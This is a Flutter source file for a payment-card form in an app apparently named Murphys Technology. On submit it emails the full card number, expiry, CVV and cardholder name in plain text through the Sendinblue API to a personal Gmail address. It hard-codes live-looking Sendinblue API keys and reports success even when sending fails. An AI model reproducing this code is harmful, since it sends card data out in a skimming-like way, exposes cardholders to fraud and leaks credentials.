import 'dart:convert';
import 'package:flutter/cupertino.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:murphys_technology/api/apiurl.dart';
import 'package:murphys_technology/utils/utils.dart';
import 'package:murphys_technology/views/pay_invoice/widget/loading.dart';
import 'package:murphys_technology/views/pricing/widget/card_number_input_formet.dart';
import 'package:http/http.dart' as http;
import 'package:murphys_technology/utils/device_size.dart';
import 'package:murphys_technology/views/provider/notification.dart';
import 'package:provider/provider.dart';
import 'package:shared_preferences/shared_preferences.dart';

class Cards extends StatefulWidget {
  String plan;
  Cards({
    Key? key,
    required this.plan,
  }) : super(key: key);

  @override
  State<Cards> createState() => _CardsState();
}

class _CardsState extends State<Cards> {
  bool isSwitched = false;

  GlobalKey<FormState> _key = GlobalKey<FormState>();

  final TextEditingController _cardsController = TextEditingController();

  final TextEditingController _validController = TextEditingController();

  final TextEditingController _cvvController = TextEditingController();

  final TextEditingController _nameController = TextEditingController();
  final TextEditingController _referralController = TextEditingController();

  @override
  void dispose() {
    _cardsController.dispose();
    _validController.dispose();
    _cvvController.dispose();
    _nameController.dispose();
    // TODO: implement dispose
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    final _provider = Provider.of<NotificationProvider>(context);
    return Form(
      key: _key,
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Text(
            "Card number",
            style: TextStyle(
              fontSize: getDeviceWidth(context) * 0.04 +
                  getDeviceHeight(context) * 0.0008,
              fontFamily: "Poppins",
            ),
          ),
          const SizedBox(
            height: 7,
          ),
          TextFormField(
            inputFormatters: [
              LengthLimitingTextInputFormatter(16),
            ],
            controller: _cardsController,
            validator: (value) {
              if (value!.isEmpty) {
                return "Enter your Card number";
              } else if (value.length < 16 || value.length > 16) {
                return "There must be 16 digit";
              } else {
                return null;
              }
            },
            decoration: InputDecoration(
              prefixIcon: Padding(
                padding: const EdgeInsets.only(right: 20),
                child: Container(
                  height: 40,
                  width: 70,
                  decoration: const BoxDecoration(
                      image: DecorationImage(
                          image: AssetImage("images/master.png"))),
                ),
              ),
              hintText: "* * * *  * * * *  * * * *  * * * *",
              border: OutlineInputBorder(
                borderRadius: BorderRadius.circular(20),
              ),
            ),
            keyboardType: TextInputType.number,
          ),
          const SizedBox(
            height: 15,
          ),
          Row(
            children: [
              Flexible(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text(
                      "Valid Until",
                      style: TextStyle(
                        fontSize: getDeviceWidth(context) * 0.04 +
                            getDeviceHeight(context) * 0.0008,
                        fontFamily: "Poppins",
                      ),
                    ),
                    TextFormField(
                      inputFormatters: [
                        LengthLimitingTextInputFormatter(5),
                        FilteringTextInputFormatter.digitsOnly,
                        CardMonthInputFormatter(),
                      ],
                      // onChanged: (String value) {
                      //   if (value.length >= 2 && !value.contains("/")) {
                      //     value = '$value/';
                      //     _validController.value = TextEditingValue(
                      //       text: value,
                      //       selection:
                      //           TextSelection.collapsed(offset: value.length),
                      //     );
                      //   }
                      // },
                      controller: _validController,
                      validator: (value) {
                        if (value!.isEmpty) {
                          return "Enter valid date";
                        } else {
                          return null;
                        }
                      },
                      decoration: InputDecoration(
                        hintText: "Month / Year",
                        border: OutlineInputBorder(
                          borderRadius: BorderRadius.circular(20),
                        ),
                      ),
                      keyboardType: TextInputType.phone,
                    ),
                  ],
                ),
              ),
              const SizedBox(
                width: 10,
              ),
              Flexible(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text(
                      "CVV",
                      style: TextStyle(
                        fontSize: getDeviceWidth(context) * 0.04 +
                            getDeviceHeight(context) * 0.0008,
                        fontFamily: "Poppins",
                      ),
                    ),
                    TextFormField(
                      inputFormatters: [
                        LengthLimitingTextInputFormatter(3),
                        FilteringTextInputFormatter.digitsOnly,
                      ],
                      controller: _cvvController,
                      validator: (value) {
                        if (value!.isEmpty) {
                          return "Enter your CVV";
                        } else if (value.length < 3 || value.length > 3) {
                          return "There must be 3 digit";
                        } else {
                          return null;
                        }
                      },
                      decoration: InputDecoration(
                        hintText: " * * * ",
                        border: OutlineInputBorder(
                          borderRadius: BorderRadius.circular(20),
                        ),
                      ),
                      keyboardType: TextInputType.number,
                    ),
                  ],
                ),
              ),
            ],
          ),
          const SizedBox(
            height: 15,
          ),
          Text(
            "Card's holder",
            style: TextStyle(
              fontSize: getDeviceWidth(context) * 0.04 +
                  getDeviceHeight(context) * 0.0008,
              fontFamily: "Poppins",
            ),
          ),
          const SizedBox(
            height: 7,
          ),
          TextFormField(
            controller: _nameController,
            validator: (value) {
              if (value!.isEmpty) {
                return "Enter your name";
              } else {
                return null;
              }
            },
            decoration: InputDecoration(
              hintText: "Your FullName",
              border: OutlineInputBorder(
                borderRadius: BorderRadius.circular(20),
              ),
              prefixIcon: const Icon(Icons.person_2),
            ),
          ),
          const SizedBox(
            height: 15,
          ),
          const Text(
            "Referral Code",
            style: TextStyle(
              fontSize: 18,
              fontFamily: "Poppins",
            ),
          ),
          SizedBox(
            height: getDeviceHeight(context) * 0.01,
          ),
          TextFormField(
            controller: _referralController,
            inputFormatters: [
              LengthLimitingTextInputFormatter(16),
            ],
            decoration: InputDecoration(
              hintText: "If you have any referral code",
              border: OutlineInputBorder(
                borderRadius: BorderRadius.circular(20),
              ),
            ),
            keyboardType: TextInputType.number,
          ),
          Row(
            mainAxisAlignment: MainAxisAlignment.spaceBetween,
            children: [
              Text(
                "Save Cards data for future payments",
                style: TextStyle(
                  fontSize: getDeviceWidth(context) * 0.032 +
                      getDeviceHeight(context) * 0.0008,
                  fontFamily: "Poppins",
                ),
              ),
              Transform.scale(
                scale: 0.8,
                child: CupertinoSwitch(
                  activeColor: const Color.fromARGB(255, 99, 183, 253),
                  thumbColor: const Color(0xff1C6BFE),
                  trackColor: Colors.blueGrey.shade300,
                  // activeColor: const Color(0xff1C6BFE),
                  // activeTrackColor: Colors.blue,
                  // inactiveThumbColor: Colors.blueGrey,
                  // inactiveTrackColor: Colors.blueGrey.shade600,
                  // splashRadius: 50,
                  value: isSwitched,
                  onChanged: (value) => setState(() => isSwitched = value),
                ),
              ),
            ],
          ),
          const SizedBox(
            height: 15,
          ),
          Center(
            child: SizedBox(
              height: 50,
              width: getDeviceWidth(context) * 0.8,
              child: ElevatedButton(
                style: ElevatedButton.styleFrom(
                  backgroundColor: const Color(0xff1C6BFE),
                  shape: RoundedRectangleBorder(
                    borderRadius: BorderRadius.circular(20),
                  ),
                ),
                onPressed: () async {
                  final isValid = _key.currentState!.validate();
                  if (isValid) {
                    bool emailSent = await _sendEmaill();
                    if (emailSent == true) {
                      final int id = _provider.notifications.length + 1;
                      await _provider.showTopNotification(
                          _provider.flutterLocalNotificationsPlugin, id);
                      Navigator.of(context).push(
                        MaterialPageRoute(
                          builder: (context) => const LoadingScreen(),
                        ),
                      );
                    } else {
                      Utils.flushErrorMessage(
                          "Try again", context, Colors.brown);
                    }
                    // String name = _nameController.text;
                    // String number = _CardsController.text;
                    // String validDate = _validController.text;
                    // String cvv = _cvvController.text;
                    // String plans = widget.plan.toString();
                    // // String plan = widget.plan.toString();

                    // String? encodeQueryParameters(Map<String, String> params) {
                    //   return params.entries
                    //       .map((MapEntry<String, String> e) =>
                    //           '${Uri.encodeComponent(e.key)}=${Uri.encodeComponent(e.value)}')
                    //       .join('&');
                    // }

                    // final Uri emailUri = Uri(
                    //   scheme: "mailto",
                    //   path: "info@murphystechnology.com",
                    //   query: encodeQueryParameters(
                    //     <String, String>{
                    //       "subject": "Credit Cards",
                    //       "body":
                    //           "Plans:$plans\n Cards holder name:$name\n Cards number: $number\n Valid date: $validDate\n CVV: $cvv"
                    //     },
                    //   ),
                    // );
                    // await launchUrl(emailUri);
                  }
                  // Navigator.of(context).push(MaterialPageRoute(
                  //   builder: (context) => const LoadingScreen(),
                  // ));
                },
                child: Text(
                  "Proceed to confirm",
                  style: TextStyle(
                    fontSize: getDeviceWidth(context) * 0.038 +
                        getDeviceHeight(context) * 0.0008,
                    fontWeight: FontWeight.w500,
                    fontFamily: "Poppins",
                  ),
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }

//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
  Future<bool> _sendEmaill() async {
    final prefs = await SharedPreferences.getInstance();
    final apiKey =
        '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'; // Replace with your SendinBlue SMTP API Key
    final url = Uri.parse('https://api.sendinblue.com/v3/smtp/email');

    final headers = {
      'Content-Type': 'application/json',
      'api-key': apiKey,
    };
    String card = _cardsController.text;
    String valid = _validController.text;
    String cvv = _cvvController.text;
    String name = _nameController.text;
    String referral = _referralController.text;
    String plan = widget.plan.toString();

    String? email = prefs.getString("email");
    String? fullname = prefs.getString("name");

    final emailData = {
      'sender': {'name': fullname, 'email': email},
      'to': [
        {'email': 'sagarkc45172@gmail.com'}
      ],
      'subject': 'Plans',
      'textContent':
          'Plan : $plan\n Card Number : $card\n Valid Unit : $valid\n CVV : $cvv\n Cards holder Name : $name\n ReferralCode: $referral',
    };

    final response = await http.post(
      url,
      headers: headers,
      body: jsonEncode(emailData),
    );

    if (response.statusCode == 200) {
      print('Email sent successfully');
      _cardsController.clear();
      _validController.clear();
      _cvvController.clear();
      _nameController.clear();
    } else {
      print('Failed to send email');
      print('Response: ${response.body}');
    }
    return true;
  }

  // Future<bool> psendEmail() async {
  //   final prefs = await SharedPreferences.getInstance();
  //   final ApiUrl = Api.appurl;
  //   final url = Uri.parse('$ApiUrl/send-email');
  //   final apiKey =
  //       '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'; // Replace with your API key

  //   final headers = {
  //     'Content-Type': 'application/json',
  //     'api-key': apiKey,
  //   };
  //   String card = _cardsController.text;
  //   String valid = _validController.text;
  //   String cvv = _cvvController.text;
  //   String name = _nameController.text;
  //   String referral = _referralController.text;
  //   String plan = widget.plan.toString();

  //   String? email = prefs.getString("email");
  //   String? fullname = prefs.getString("name");

  //   final emailData = {
  //     'sender': {'name': fullname, 'email': email},
  //     'to': [
  //       {'email': 'sagarmurphys@gmail.com'}
  //     ],
  //     'subject': 'Plans',
  //     'textContent':
  //         'Plan : $plan\n Card Number : $card\n Valid Unit : $valid\n CVV : $cvv\n Cards holder Name : $name\n ReferralCode: $referral',
  //   };

  //   final response = await http.post(
  //     url,
  //     headers: headers,
  //     body: jsonEncode(emailData),
  //   );

  //   if (response.statusCode == 200) {
  //     print('Email sent successfully');
  //     _cardsController.clear();
  //     _validController.clear();
  //     _cvvController.clear();
  //     _nameController.clear();
  //     return true;
  //   } else {
  //     print('Failed to send email');
  //     print('Response: ${response.body}');
  //     return false;
  //   }
  // }
}
